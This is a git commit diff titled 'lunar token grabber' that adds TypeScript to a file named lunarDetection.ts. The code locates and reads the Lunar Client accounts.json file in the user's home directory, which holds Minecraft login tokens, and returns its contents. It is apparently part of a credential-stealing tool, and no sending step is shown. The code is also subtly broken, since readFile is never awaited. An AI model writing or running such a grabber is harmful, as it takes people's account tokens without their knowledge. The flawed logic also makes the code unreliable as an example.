a2c2bf1f76aaf04d5c9c57ffb5bb30610423dbdb
Bernardo <leoaaa96@gmail.com>
2026-08-18 12:28:26 -0300

    feat: lunar token grabber

--- src/service/lunarDetection.ts
+++ src/service/lunarDetection.ts
@@ -1,7 +1,25 @@
-import "node:fs/promises";
+import { readFile } from 'node:fs/promises';
 import path from "node:path";
+import os from "node:os";
 
-export async function grabLunarToken(){
+export async function grabLunarToken(): Promise<string>{
+    try{
+        const caminho =  path.join(os.homedir(),'.lunarclient','settings','game','accounts.json');
+        console.log(`path pro lunar: ${caminho}`);
+
+        
+        const lunarJson = readFile(caminho, {encoding: 'utf-8'});
+
+        if(!lunarJson){
+            throw new Error("não achou a bomba do lunar json");
+        }
+
+        return lunarJson;
+    
+    
+    }catch(error){
+        throw new Error(`deu erro aqui: ${error}`);
+    }
 
 }
 
